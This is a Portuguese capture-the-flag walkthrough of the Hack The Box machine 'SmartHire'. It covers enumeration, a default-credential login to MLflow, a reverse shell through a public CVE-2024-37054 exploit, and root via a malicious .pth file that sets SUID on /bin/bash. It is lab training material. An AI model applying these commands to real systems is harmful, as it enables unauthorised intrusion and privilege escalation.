#Hack-The-Box 

---

<img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58333-5cc9-413e-ac18-c38bbfe4a21e-1778696818.png" width="300" align="right">
Máquina: SmartHire
Dificuldade: Média
Plataforma: Hack The Box
Sistema Operacional: Linux






# Reconhecimento

Iniciamos com uma enumeração do host, utilizando o Nmap afim de identificar serviços expostos e portas ativas.

```
nmap -p- --min-rate 1600 -sVC -Pn --open 10.129.245.215
```

![[SmartHire.png]]

Com a saída do `Nmap` identificamos o domínio `smarthire.htb`, o adicionamos ao arquivo `/etc/hosts`.

```shell
echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts
```

Navegando até o domínio, nos deparamos com uma aplicação web

![[SmartHire02.png]]
# Enumeração

Em seguida, decidimos fazer um **fuzzing** de subdomínios utilizando a ferramenta **Gobuster**, para descobrirmos subdomínios ocultos.

```shell
ffuf -u http://FUZZ.smarthire.htb/ -H "Host: FUZZ.smarthire.htb" -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 160
```

![[SmartHire03.png]]

Ao identificarmos o subdomínio `models.smarthire.htb`, também o adicionamos ao arquivo `/etc/hosts`. Em seguida navegamos até esse subdomínio onde nos deparamos com um campo de login:

![[SmartHire04.png]]

Para identificar qual serviço está rodando nesse campo de login, enviamos uma requisição `GET` via `cURL` descobrindo que rodava um `mlflow` podendo assim buscar por credenciais padrões. 

![[SmartHire05.png]]

Pesquisando por credenciais padrões para o `mlflow`, conseguimos acesso a aplicação com a credencial:

```shell
admin:password
```

Onde fomos redirecionados para sua interface identificando que o `mlflow` rodava na versão `2.14.3`:

![[SmartHire06.png]]

Em seguida, realizamos uma pesquisa para identificar possíveis vulnerabilidades no qual descobrirmos que essa versão do `mlflow` era vulnerável a `CVE-2024-37054` que permite `Remote Code Execution` .

```shell
https://nvd.nist.gov/vuln/detail/CVE-2024-37054
```
# Exploração

Para explorarmos essa vulnerabilidade utilizamos o seguinte exploit

```shell
https://github.com/jimmexploit/CVE-2024-37054-PoC
```

Comando utilizado:

```shell
python3 shell.py --lhost 10.10.16.147 --lport 4444 --atoz
```

![[SmartHire07.png]]

Conseguimos estabelecer `Reverse Shell`, em que iniciamos como usuário `svcweb`

![[SmartHire08.png]]
# Obtendo a user flag

Navegamos até o diretório do usuário `/home/svcweb` assim encontrando a primeira flag 

![[SmartHire09.png]]
# Escalação de privilégio

Utilizamos o comando `sudo -l` para verificar as permissões de execução de comandos do usuário `svcweb`. E identificamos que esse usuário pode executar como `root` sem a necessidade de senha esse comando:

```shell
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

![[SmartHire10.png]]

Indo até o diretório do script Python `mlflowctl.py` podemos analisar o código

```Python
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

Podemos ver que esse código é vulnerável a `Path Hijacking` por conta essa parte especifica:

```Python
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

Em seguida, verificamos dentro do diretório `plugins` quais arquivos temos permissões de escrita, para gravarmos um arquivo malicioso em que rodando o código python ele nos forneça acesso `root` 

```shell
find /opt/tools/mlflow_ctl/plugins/ -writable 2>/dev/null
```

![[SmartHire11.png]]

Como podemos ver o diretório `/plugins/dev` nos permite escrever nele sendo assim criamos o arquivo malicioso `pwn.pth` 

```shell
echo "import os; os.system('chmod +s /bin/bash')" > \ /opt/tools/mlflow_ctl/plugins/dev/pwn.pth
```

E rodamos o script 

```shell
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Conseguindo obter `root`

![[SmartHire12.png]]

# Obtendo a root flag

Como usuário `root`, fomos até seu diretório e obtemos a última flag

![[SmartHire13.png]]
